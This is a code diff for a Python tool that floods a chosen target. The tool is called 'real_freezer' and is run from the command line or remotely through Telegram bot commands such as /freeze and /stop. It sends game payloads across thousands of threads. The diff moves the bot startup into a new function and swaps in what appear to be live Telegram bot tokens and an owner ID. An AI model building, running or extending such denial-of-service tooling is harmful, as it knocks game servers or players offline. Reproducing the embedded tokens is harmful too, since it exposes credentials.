@@ -14,7 +14,6 @@ import time
 import argparse
 import sys
 import os
-import signal
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
@@ -22,7 +21,7 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 os.system('clear')
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
-BOT_TOKEN = "8754071723:AAFkPQ7abOCogAC3rBsUROc9IyHjyddb2Ag"
+BOT_TOKEN = "8824657166:AAF_emEYxOjlMwMw8MEixEpq6rQzWFFyLUg"
 ALLOWED_USERS = [7504108653]
 # ──────────────────────────────────────────────────────────────────────────────
 
@@ -90,7 +89,7 @@ async def real_freezer(target, threads=3000, duration=300):
     print(f"\033[93m⚡ THREADS: \033[92m{threads:,}\033[0m")
     print(f"\033[96m═══════════════════════════════════════════════\033[0m")
 
-    payloads = GAME_PAYLOADS * 5  # More payloads
+    payloads = GAME_PAYLOADS * 5
     tasks = []
 
     print(f"\033[92m🚀 LAUNCHING {threads:,} MISSILES...\033[0m")
@@ -261,10 +260,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await query.edit_message_text("Unknown option.")
 
-# ─── TELEGRAM BOT STARTUP WITH WELCOME MESSAGE ──────────────────────────
-
 async def send_bot_online_notification(application: Application):
-    """Send 'bot online' message to the authorized user when bot starts."""
+    """Send bot online message to the authorized user when bot starts."""
     user_id = ALLOWED_USERS[0]
     try:
         await application.bot.send_message(
@@ -290,10 +287,28 @@ async def send_bot_online_notification(application: Application):
     except Exception as e:
         print(f"⚠️ Could not send welcome message: {e}")
 
-
 async def post_init(application: Application):
     """Called after app initialization — sends online notification."""
     await send_bot_online_notification(application)
+
+def start_bot():
+    """Initialize and start the Telegram bot."""
+    print("🤖 Starting Telegram Bot mode...")
+    print(f"🔑 Token: {BOT_TOKEN[:10]}...")
+    print(f"👤 Owner ID: {ALLOWED_USERS[0]}")
+    
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", start))
+    app.add_handler(CommandHandler("freeze", freeze_cmd))
+    app.add_handler(CommandHandler("stop", stop_cmd))
+    app.add_handler(CommandHandler("status", status_cmd))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    
+    print("✅ Bot running! Press Ctrl+C to stop.")
+    print("📱 Check Telegram — you'll receive an online notification.")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 # ─── CLI MAIN (ORIGINAL - UNCHANGED) ──────────────────────────────────────
 
@@ -308,16 +323,7 @@ def main():
     try:
         args = parser.parse_args()
         if args.telegram:
-            print("🤖 Starting Telegram Bot mode...")
-            app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
-            app.add_handler(CommandHandler("start", start))
-            app.add_handler(CommandHandler("help", start))
-            app.add_handler(CommandHandler("freeze", freeze_cmd))
-            app.add_handler(CommandHandler("stop", stop_cmd))
-            app.add_handler(CommandHandler("status", status_cmd))
-            app.add_handler(CallbackQueryHandler(button_handler))
-            print("✅ Bot running! Press Ctrl+C to stop.")
-            app.run_polling(allowed_updates=Update.ALL_TYPES)
+            start_bot()
             return
         if args.freeze or args.attack:
             target = args.freeze or args.attack
